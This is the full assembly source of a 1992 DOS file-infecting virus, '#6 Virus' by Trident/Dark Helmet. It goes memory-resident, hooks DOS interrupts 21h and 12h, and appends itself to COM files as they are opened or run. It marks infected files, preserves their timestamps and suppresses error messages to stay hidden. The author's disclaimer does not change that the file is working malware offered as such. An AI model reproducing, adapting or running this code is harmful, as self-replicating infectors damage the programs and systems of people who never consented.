;*****************************************************************************
;	#6 Virus							     *
;									     *
;	Assembled with Tasm 2.5						     *
;	(c) 1992 Trident/Dark Helmet, The Netherlands			     *
;									     *
;       The author(s) take(s) no responsibility for any damaged caused by    *
;       this virus.							     *
;*****************************************************************************

		.RADIX 	16
virus		SEGMENT
		MODEL 	SMALL
		ASSUME 	cs:virus, ds:virus, es:virus
		ORG	100h

len		EQU	OFFSET last - begin

dummy:		DB	0e9h,02h,00h,86h,54h		; Jump to start of
							; viruscode.
begin:		CALL	start				; make a call to
							; push the IP on the
							; stack.
start:		POP	bp				; get the IP of the
							; stack.
		SUB     bp,108h				; adjust BP (=IP)
							; for offset of DATA.
		
restore:	MOV	di,0100h			; copy the original
		LEA	si,ds:[carrier_begin+bp]	; host begin code back.
		MOV	cx,05h  
		REP     MOVSB	

check:		MOV	ah,0a0h				; check if virus
		INT	21h				; allready resident.
		CMP	ax,8654h
		JE	end_virus

memory:		MOV	ax,cs				; DS = Memory Control
		DEC 	ax				; Blok (MCB).
		MOV	ds,ax				
		CMP     BYTE PTR ds:[0000],5ah		; check first byte if
		JNE	abort				; last MCB.
		MOV	ax,ds:[0003]			; decrease memory size.
		SUB	ax,40
		MOV	ds:[0003],AX

		PUSH	cs				; restore ds.
		POP	ds

install:	MOV	bx,ax				; ES point where	
		MOV	ax,es				; to copy virus in 
		ADD	ax,bx				; memory.
		MOV	es,ax
		
		MOV	cx,len				; copy virus to
		LEA	si,ds:[begin+bp]		; memory.
		LEA	di,es:0105			; offset = 105
		REP	MOVSB	
		MOV	[virus_segment+bp],es		; store virus_segment

		PUSH	cs				; restore es
		POP	es

hook_vectors:	CLI

		MOV	ax,3521h			; hook int 21h
		INT	21h
		MOV	ds,[virus_segment+bp]
		MOV	old_21h,bx
		MOV	old_21h+2,es
		MOV	dx,offset main_virus 
		MOV	ax,2521h
		INT	21h

		MOV	ax,3512h			; hook int 12h
		INT	21h
		MOV	old_12h,bx
		MOV	old_12h+2,es
		MOV	dx,offset new_12h
		MOV	ax,2512h
		INT	21h
		
		STI

abort:		MOV	ax,cs				; restore ds,es
		MOV	ds,ax
		MOV	es,ax

end_virus:	MOV	bx,0100h			; jump to begin host
		PUSH	bx
		XOR	bx,bx
		XOR	bp,bp
		XOR	ax,ax
		XOR	cx,cx
		RET
		
;*****************************************************************************
;									     *
;	This part will intercept the interuptvectors and copy itself to	     *
;	other host programs						     *
;									     *
;*****************************************************************************

main_virus:	PUSHF
		CMP	ah,0a0h				; check if virus calls
		JNE	new_21h				; and return id.
		MOV	ax,8654h
		POPF
		IRET
							
new_21h:	PUSH	ds				; new interupt 21  
		PUSH	es				; routine
		PUSH	di
		PUSH	si
		PUSH	ax
		PUSH	bx
		PUSH	cx
		PUSH	dx
		PUSH	sp
		PUSH	bp

check_open:	CMP	ah,3dh				; check if a file is
		JNE	check_exec			; being opened
		JMP	chk_com
		
check_exec:	CMP	ax,04b00h			; check if a file is
		JNE 	continu				; executed
		JMP	chk_com

continu:	POP	bp
		POP	sp
		POP	dx				; continu with 
		POP	cx				; interrupt	
		POP	bx
		POP	ax
		POP	si
		POP	di
		POP	es
		POP	ds
		POPF
		JMP	DWORD PTR cs:[old_21h]

chk_com:	MOV	cs:[name_seg],ds
		MOV	cs:[name_off],dx
		CLD					; check if extension
		MOV	di,dx				; is COM file
		PUSH	ds
		POP	es
		MOV	al,'.'	
		REPNE	SCASB				
		CMP	WORD PTR es:[di],'OC'
		JNE	continu
		CMP	WORD PTR es:[di+2],'M'
		JNE	continu
		
		CMP	WORD PTR es:[di-7],'MO'		; Check for 
		JNE	error				; COMMAND.COM
		CMP	WORD PTR es:[di-5],'AM'
		JNE	error
		CMP	WORD PTR es:[di-3],'DN'
		JE	continu		

error:		CALL	int24h				; take care of error
							; messages
		CALL	set_atribute			; set atribute for 
							; writing

open_file:	MOV	ds,cs:[name_seg]		; open file
		MOV	dx,cs:[name_off]
		MOV	ax,3d02h
		CALL	do_int21h
		JC	close_file
		PUSH	cs
		POP	ds
		MOV	[handle],ax
		MOV	bx,ax
		
		CALL	get_date

check_infect:	PUSH	CS				; check if file 
		POP	DS				; already infect
		MOV	BX,[handle]
		MOV	ah,3fh
		MOV	cx,05h
		LEA	dx,[carrier_begin]
		CALL	do_int21h
		MOV	al, BYTE PTR [carrier_begin]+3	; look for 
		MOV	ah, BYTE PTR [carrier_begin]+4  ; identification byte's
		CMP	ax,[initials]
		JE	save_date

get_lenght:	MOV	ax,4200h
		CALL	move_pointer
		MOV	ax,4202h
		CALL	move_pointer
		SUB	AX,03h
		MOV	[lenght_file],ax

		CALL	write_jmp			; write jump 
							; instruction.
		CALL	write_virus			; write virus
							; body.

save_date:	PUSH	CS
		POP	DS
		MOV	bx,[handle]
		MOV	dx,[date]
		MOV	cx,[time]
		MOV	ax,5701h
		CALL	do_int21h

close_file:	MOV	bx,[handle]			; close file	
		MOV	ah,3eh
		CALL	do_int21h
		
restore_int24h:	MOV	dx,cs:[old_24h]			; restore int24
		MOV	ds,cs:[old_24h+2]		; for critical 
		MOV	ax,2524h			; error handling
		CALL	do_int21h
		
		JMP	continu

new_24h:	MOV	al,3
		IRET

new_12h:	JMP	DWORD PTR cs:[old_12h]
		SUB	ax,50
		IRET		

;*****************************************************************************

move_pointer:	PUSH	cs
		POP	ds
		MOV	bx,[handle]
		XOR	cx,cx
		XOR	dx,dx
		CALL	do_int21h
		RET

do_int21h:	PUSHF
		CALL	DWORD PTR cs:[old_21h]
		RET

write_jmp:	PUSH	CS
		POP	DS
		
		MOV	ax,4200h			; write jump 
		CALL	move_pointer			; instruction
		MOV	ah,40h
		MOV	cx,01h
		LEA	dx,[jump]
		CALL	do_int21h
		
  		MOV	ah,40h				; write offset of
		MOV	cx,02h				; jump
		LEA	dx,[lenght_file]
		CALL	do_int21h
		
		MOV	ah,40h				; write mark for
		MOV	cx,02h				; infection
		LEA	dx,[initials]
		CALL	do_int21h
		RET

write_virus:	PUSH	CS
		POP	DS

		MOV	ax,4202h			; write main
		CALL	move_pointer			; virus body
		MOV	ah,40				; at end of
		MOV	cx,len				; program
		MOV	dx,105h
		CALL	do_int21h
		RET

get_date:	MOV	ax,5700h
		CALL	do_int21h
		PUSH	cs
		POP	ds
		MOV	[date],dx
		MOV	[time],cx
		RET

int24h:		MOV	ax,3524h
		CALL	do_int21h
		MOV	cs:[old_24h],bx
		MOV	cs:[old_24h+2],es
		MOV	dx,offset new_24h
		PUSH	CS
		POP	DS
		MOV	AX,2524h
		CALL	do_int21h
		RET

set_atribute:	MOV	ax,4300h			; get atribute
		MOV	ds,cs:[name_seg]
		MOV	dx,cs:[name_off]
		CALL	do_int21h

		AND	cl,0feh				; set atribute
		MOV	ax,4301h
		CALL	do_int21h
		RET

;*****************************************************************************

text		db	'#6 Virus, Trident/The Netherlands 1992'
old_12h		dw	00h,00h
old_21h		dw 	00h,00h
old_24h		dw 	00h,00h
carrier_begin	db 	090h,0cdh,020h,086h,054h
jump		db	0e9h
name_seg	dw	?
name_off	dw	?
virus_segment	dw	?
handle		dw	?
lenght_file	dw	?
date		dw	?
time		dw	?
initials	dw	5486h
last		db	090h

virus		ends
		end 	dummy
